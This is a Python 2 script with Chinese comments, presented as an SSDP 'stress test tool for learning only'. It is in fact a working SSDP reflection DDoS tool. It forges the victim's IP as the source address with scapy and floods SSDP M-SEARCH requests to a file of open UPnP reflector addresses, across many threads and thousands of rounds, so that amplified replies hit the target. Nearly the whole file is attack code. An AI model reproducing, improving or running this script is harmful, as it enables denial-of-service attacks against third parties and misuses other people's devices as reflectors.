#!/usr/bin/python
#-*- coding: utf-8 -*- 
import os 
import random
import signal
import sys
import thread
from time import sleep
try:
    from scapy.all import conf
    from scapy.all import *
except:
    print '[>]没有安装scapy 请先安装scapy'

print  '''
SSDP压力测试工具
该软件仅供学习使用
'''
#msg = 'M-SEARCH * HTTP/1.1\r\n'+'Host:239.255.255.250:1900\r\n'+'ST:upnp:rootdevice\r\n'+'Man:"ssdp:discover"\r\n'+'MX:1\r\n'

msg = [  
    'M-SEARCH * HTTP/1.1',
    'Host:239.255.255.250:1900',
    'ST:upnp:rootdevice',
    'Man:"ssdp:discover"',
    'MX:1',
    '']
sendmsg = '\r\n'.join(msg)

print len(sys.argv)
# 判断参数是否合法
if len(sys.argv) !=3:
    print '用法: ./ssdp.py [ip] [线程数]'
    print '例如 : ./ssdp.py 192.168.1.133  100'
    sys.exit()

target =str(sys.argv[1]) # 格式化 攻击目标格式化
threads=int(sys.argv[2])# 格式化 启动线程数格式话

# 准备攻击项目
# targetip 目标ip 
def attack(srcip,ssdptarget):
    global sendmsg

    x =random.randint(0,65535)
    #x =12345
    #ssdptarget = '112.226.62.6'
    #send(IP(dst=ssdptarget,src=srcip)/UDP(dport=1900,sport=x)/sendmsg,verbose=1，timeout=10)

    i =IP()
    i.dst=ssdptarget
    i.src=srcip
    u=UDP()
    u.dport=1900
    u.sport=x
    send(i/u/sendmsg)
    print '发送成功'

    pass

# 读取文件
# 从文件中获取ssdip地址列表
iplist=[]
def readFile(filename):
    global iplist
    global target
    f = open(filename)
    for ip in f:
        ip = ip.strip()
        iplist.append(ip)

# 攻击前准备 
def beforeattack():
    global iplist
    global target
    for ip in iplist:
        print ip
        attack(target,ip)
def testfor():
        for i in range(0,10000):
            beforeattack()  

'''
    准备获取IP列表
'''
print '正在获取payload列表'
readFile('ssdpip.txt')
print 'payload列表加载完成'
print '共计：'+str(len(iplist))+'个payload'
'''
准备启动线程
'''
for x in range(0,threads):
    thread.start_new_thread(testfor,())
while True:
    sleep(1)